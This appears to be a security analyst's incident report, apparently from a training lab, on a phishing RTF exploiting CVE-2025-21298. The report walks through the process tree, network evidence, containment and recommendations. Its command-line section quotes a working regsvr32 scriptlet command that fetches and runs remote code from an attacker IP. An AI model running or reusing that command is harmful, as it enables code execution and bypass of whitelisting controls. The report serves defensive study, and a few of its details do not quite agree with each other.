Summary

A phishing email containing mail.rtf was delivered to [email protected]. The attachment exploited CVE-2025-21298, a Windows OLE zero-click RCE vulnerability. The attack triggered a process chain from Outlook abusing regsvr32.exe (a LOLBin) to fetch and execute a remote scriptlet fileless from an attacker-controlled server. The host was confirmed compromised and isolated via EDR.

Investigation Walkthrough

1. Initial Alert Review

Reviewed all alert metadata. A significant time gap — email at 05:12 AM, alert at 04:18 PM — confirmed the user manually opened the attachment ~11 hours after delivery, initiating the exploit.

2. EDR — Process Tree Analysis

EDR on host Austin revealed a highly suspicious execution chain:

OUTLOOK.exe
    └── Explorer.exe
            └── cmd.exe
                    └── regsvr32.exe

Outlook spawning cmd.exe then regsvr32.exe is not normal behavior — these are LOLBins (Living-Off-The-Land Binaries) abused to evade detection.

3. Command-Line Analysis

The exact malicious command executed:

C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118/shell.sct scrobj.dll

This is a regsvr32 AppLocker bypass — malicious code executes entirely in memory, leaving no traditional executable on disk.

4. Network Analysis

Confirmed a successful outbound connection to hxxp[://]84[.]38[.]130[.]118/shell.sct. Not quarantined because regsvr32.exe is a trusted signed Windows binary.

5. File Analysis

mail.rtf confirmed to exploit CVE-2025-21298 — a Windows OLE vulnerability that triggers RCE on simply opening or previewing the file. No macro enablement or further interaction required.

6. Containment

Immediately isolated host Austin via EDR to cut off C2 communication and preserve forensic evidence.

Recommendations
  • Block C2 IP 84.38.130.118 at network perimeter and firewall
  • Block sender email [email protected] in email gateway
  • Apply Microsoft security patch for CVE-2025-21298 across all endpoints
  • Implement detection rules for regsvr32.exe spawning from OUTLOOK.exe
  • Enable Script Block Logging and AMSI to detect fileless scriptlet execution
  • Reset credentials for affected user [email protected]
Key Learnings
  • LOLBin abuse is subtle but detectable. regsvr32.exe and cmd.exe are legitimate tools — context (spawned from OUTLOOK.exe) makes them suspicious, not the process name alone.
  • Fileless techniques bypass traditional AV. No file dropped to disk means signature-based tools can't detect it. Behavioral EDR is essential for catching this class of attack.
  • Zero-click RCE is especially dangerous. CVE-2025-21298 requires no macro enablement — just opening the RTF is enough to trigger the exploit.
  • Delivery time vs alert trigger time matters. The 11-hour gap confirmed user-initiated action, which shaped the entire investigation timeline.
  • Multi-source TI accelerates triage. Five platforms all agreeing the file is malicious removed all doubt quickly and confidently.
